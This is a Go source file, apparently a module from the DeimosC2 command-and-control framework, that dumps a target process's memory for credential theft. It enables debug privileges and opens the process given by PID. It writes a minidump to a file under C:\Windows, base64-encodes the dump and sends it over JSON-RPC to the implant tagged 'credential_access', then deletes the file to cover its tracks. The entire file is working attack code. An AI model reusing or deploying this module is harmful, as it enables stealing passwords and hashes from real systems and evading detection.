package main

import (
	//	"C"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"os"
	"path"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"strconv"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/privileges"
	ps "github.com/mitchellh/go-ps"
)

type downloadOutput struct {
	Filename string
	Filedata string
}

//DllOptions is used for passed variables to DLLS
type DllOptions struct {
	Options []string
}

var kernel32 = syscall.NewLazyDLL("kernel32.dll")
var procOpenProcess = kernel32.NewProc("OpenProcess")
var procCreateFileW = kernel32.NewProc("CreateFileW")
var procCloseHandle = kernel32.NewProc("CloseHandle")

var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
var procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")

func runModule(options DllOptions) {

	conn, err := net.Dial("tcp", "127.0.0.1:"+options.Options[0])
	if err != nil {
		log.Fatal("Dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	//Set process to be SeDebugPrivileges
	privileges.SePrivEnable()

	pid, _ := strconv.Atoi(options.Options[1])

	processHandle, _, _ := procOpenProcess.Call(uintptr(0xFFFF), uintptr(1), uintptr(pid))

	p, err := ps.FindProcess(pid)
	var dmpFile = path.Join("C:", "Windows", p.Executable())

	if _, err := os.Stat(dmpFile); os.IsNotExist(err) {
		os.Create(dmpFile)
	}
	path, _ := syscall.UTF16PtrFromString(dmpFile)

	fileHandle, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(path)), syscall.GENERIC_WRITE, syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE, 0, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)

	ret, _, err := procMiniDumpWriteDump.Call(uintptr(processHandle), uintptr(pid), uintptr(fileHandle), 0x00061907, 0, 0, 0)

	procCloseHandle.Call(uintptr(fileHandle))

	if ret != 0 {
		logging.Logger.Println("Process memory dump successful")
	} else {
		log.Fatal("Process memory dmp error: ", err)
	}
	fileData, err := ioutil.ReadFile(dmpFile)
	if err != nil {
		logging.Logger.Println(err)
	}

	downloadStruct := downloadOutput{
		Filename: filepath.Base(dmpFile),
		Filedata: base64.StdEncoding.EncodeToString(fileData),
	}

	sendData, err := json.Marshal(downloadStruct)

	var reply int
	sendon := modulescommon.ModuleCom{"", true, false, false, "minidump", "credential_access", ".exe", sendData}
	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	time.Sleep(3 * time.Second)

	sendon = modulescommon.ModuleCom{"", true, false, true, "minidump", "credential_access", ".exe", nil}

	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	err = os.Remove(dmpFile)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}
}

func main() {
	args := DllOptions{}
	var tempArgs []string
	tempArgs = append(tempArgs, os.Args[1])
	tempArgs = append(tempArgs, os.Args[2])
	args.Options = tempArgs
	runModule(args)
}

//export StartModule
//StartModule converts the string into a port number
// func StartModule(data *C.char) {
// 	var passedOptions string
// 	if len(C.GoString(data)) > 0 {
// 		passedOptions = C.GoString(data)
// 	}
// 	options := DllOptions{}
// 	json.Unmarshal([]byte(passedOptions), &options)
// 	runModule(options)
// }
